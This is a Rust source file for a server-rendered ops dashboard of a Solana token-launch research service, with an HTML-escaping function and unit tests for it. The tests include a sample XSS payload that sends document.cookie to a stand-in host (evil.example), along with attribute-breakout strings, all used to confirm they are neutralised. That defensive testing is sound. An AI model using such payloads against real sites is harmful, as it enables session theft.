// SPDX-License-Identifier: Apache-2.0
//! The read-only ops page.
//!
//! Server-rendered, no build step, no JavaScript. It answers one question — what
//! is Radar actually doing right now — and it computes nothing it does not have,
//! so it cannot be stale.
//!
//! Everything creator-supplied that reaches this page is escaped. Token names and
//! symbols are arbitrary bytes chosen by someone who benefits from you
//! misreading them, and an ops page that renders them raw is a stored
//! cross-site-scripting hole with a token launcher as the attacker.

use core::fmt::Write as _;

use radar_store::{Event, Reader, Table};
use radar_types::Slot;

use crate::AppState;

/// Escapes text for HTML.
///
/// Applied to every creator-supplied string without exception. The cost of
/// escaping something that did not need it is nothing; the cost of missing one
/// is an operator's browser running a token launcher's script.
fn escape(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 16);
    for c in s.chars() {
        match c {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&#39;"),
            // Control characters and bidi overrides are shown rather than obeyed,
            // so two names that differ only invisibly do not render alike.
            c if c.is_control()
                || matches!(c, '\u{200b}'..='\u{200f}' | '\u{202a}'..='\u{202e}') =>
            {
                out.push('·');
            }
            c => out.push(c),
        }
    }
    out
}

const STYLE: &str = "
:root { color-scheme: light dark; --fg: #111; --dim: #666; --line: #ddd; --bg: #fff; }
@media (prefers-color-scheme: dark) {
  :root { --fg: #e8e8e8; --dim: #999; --line: #333; --bg: #121212; }
}
body { font: 14px/1.55 ui-monospace, SFMono-Regular, Menlo, monospace;
       max-width: 74rem; margin: 2rem auto; padding: 0 1.25rem;
       color: var(--fg); background: var(--bg); }
h1 { font-size: 1.15rem; margin: 0 0 .25rem; letter-spacing: .01em; }
h2 { font-size: .95rem; margin: 2rem 0 .5rem; color: var(--dim);
     text-transform: uppercase; letter-spacing: .08em; font-weight: 600; }
.sub { color: var(--dim); margin: 0 0 1.5rem; }
table { border-collapse: collapse; width: 100%; }
th, td { text-align: left; padding: .3rem .6rem .3rem 0;
         border-bottom: 1px solid var(--line); vertical-align: top; }
th { color: var(--dim); font-weight: 600; }
td.num { text-align: right; font-variant-numeric: tabular-nums; }
.grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(11rem, 1fr)); gap: .75rem; }
.card { border: 1px solid var(--line); padding: .7rem .85rem; border-radius: 6px; }
.card .k { color: var(--dim); font-size: .8rem; }
.card .v { font-size: 1.3rem; font-variant-numeric: tabular-nums; }
.mint { font-size: .8rem; color: var(--dim); }
.warn { color: #b45309; }
";

/// Renders the page.
#[must_use]
pub fn render(state: &AppState) -> String {
    let watermark = Reader::watermark(&state.store).ok().flatten();
    let launches = watermark
        .map(|w| state.store.read(Table::Launches, radar_asof::AsOf::at(w)))
        .and_then(Result::ok)
        .unwrap_or_default();

    let mut body = String::new();
    let _ = write!(
        body,
        "<h1>Radar</h1><p class=\"sub\">Solana research intelligence · v{}</p>",
        env!("CARGO_PKG_VERSION")
    );

    body.push_str(&summary_cards(&launches, watermark, state));
    body.push_str(&instrument_table(state));
    body.push_str(&recent_launches(&launches));

    format!(
        "<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\">\
         <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\
         <title>Radar</title><style>{STYLE}</style></head><body>{body}</body></html>"
    )
}

fn summary_cards(launches: &[Event], watermark: Option<Slot>, state: &AppState) -> String {
    let creators: std::collections::BTreeSet<String> = launches
        .iter()
        .filter_map(|e| match e {
            Event::Launch(l) => Some(l.creator.to_string()),
            _ => None,
        })
        .collect();

    let unknown = launches.iter().filter(|e| !origin_known(e)).count();

    let card = |k: &str, v: String| {
        format!("<div class=\"card\"><div class=\"k\">{k}</div><div class=\"v\">{v}</div></div>")
    };

    let mut out = String::from("<h2>Store</h2><div class=\"grid\">");
    out.push_str(&card("launches recorded", launches.len().to_string()));
    out.push_str(&card("distinct creators", creators.len().to_string()));
    out.push_str(&card(
        "watermark slot",
        watermark.map_or_else(|| "&mdash;".to_owned(), |w| w.get().to_string()),
    ));
    out.push_str(&card("instruments", state.registry.len().to_string()));
    out.push_str(&card(
        "paid surface",
        if state.x402.is_some() {
            "on".to_owned()
        } else {
            "off".to_owned()
        },
    ));
    // The program-upgrade alarm, on the page rather than buried in a log.
    out.push_str(&card(
        "unknown instructions",
        if unknown > 0 {
            format!("<span class=\"warn\">{unknown}</span>")
        } else {
            "0".to_owned()
        },
    ));
    out.push_str("</div>");
    out
}

fn origin_known(event: &Event) -> bool {
    match event {
        Event::Launch(l) => l.origin.known,
        Event::Trade(t) => t.origin.known,
        Event::Graduation(g) => g.origin.known,
    }
}

fn instrument_table(state: &AppState) -> String {
    let margin = state
        .x402
        .as_ref()
        .map_or(radar_instruments::DEFAULT_MARGIN_PERCENT, |c| {
            c.margin_percent
        });

    let mut out = String::from(
        "<h2>Instruments</h2><table><tr><th>name</th><th>ver</th><th>latency</th>\
         <th>price</th><th>summary</th></tr>",
    );
    for instrument in state.registry.iter() {
        let spec = instrument.spec();
        let _ = write!(
            out,
            "<tr><td>{}</td><td>{}</td><td>{:?}</td><td class=\"num\">{}</td><td>{}</td></tr>",
            escape(spec.name),
            spec.version,
            spec.latency,
            spec.public_price(margin),
            escape(spec.summary),
        );
    }
    out.push_str("</table>");
    out
}

fn recent_launches(launches: &[Event]) -> String {
    let mut recent: Vec<&Event> = launches.iter().collect();
    recent.sort_by_key(|e| std::cmp::Reverse(e.slot()));

    let mut out = String::from(
        "<h2>Recent launches</h2><table><tr><th>slot</th><th>symbol</th>\
         <th>name</th><th>mint</th></tr>",
    );
    for event in recent.iter().take(25) {
        let Event::Launch(l) = event else { continue };
        let _ = write!(
            out,
            "<tr><td class=\"num\">{}</td><td>{}</td><td>{}</td><td class=\"mint\">{}</td></tr>",
            l.envelope.slot,
            escape(&l.symbol),
            escape(&l.name),
            escape(&l.mint.to_string()),
        );
    }
    out.push_str("</table>");
    if recent.is_empty() {
        out.push_str("<p class=\"sub\">Nothing recorded yet.</p>");
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_token_name_cannot_inject_script() {
        // A creator chooses this string. An ops page that renders it raw is a
        // stored XSS hole whose attacker is a token launcher.
        let evil = "<script>fetch('//evil.example/'+document.cookie)</script>";
        let out = escape(evil);
        assert!(!out.contains("<script"), "{out}");
        assert!(out.contains("&lt;script&gt;"), "{out}");
    }

    #[test]
    fn attribute_breakouts_are_escaped_too() {
        let out = escape("\" onmouseover=\"alert(1)");
        assert!(!out.contains('"'), "{out}");
        assert!(out.contains("&quot;"), "{out}");
        assert!(!escape("' onload='x").contains('\''));
    }

    #[test]
    fn invisible_characters_are_shown_rather_than_obeyed() {
        // Two names differing only by a zero-width space must not render alike,
        // or an operator cannot tell a copy from the original.
        assert_eq!(escape("A\u{200b}B"), "A·B");
        assert_eq!(escape("safe\u{202e}txet"), "safe·txet");
        assert_eq!(escape("line\nbreak"), "line·break");
    }

    #[test]
    fn ordinary_text_is_left_alone() {
        assert_eq!(escape("Cursed Pill"), "Cursed Pill");
        assert_eq!(escape("牛来 🚀"), "牛来 🚀");
    }

    #[test]
    fn ampersands_are_escaped_before_anything_else() {
        // Escaping `&` last would double-escape the entities produced by the
        // other rules and render `&lt;` as visible text.
        assert_eq!(escape("a&b"), "a&amp;b");
        assert_eq!(escape("a&lt;b"), "a&amp;lt;b");
    }
}
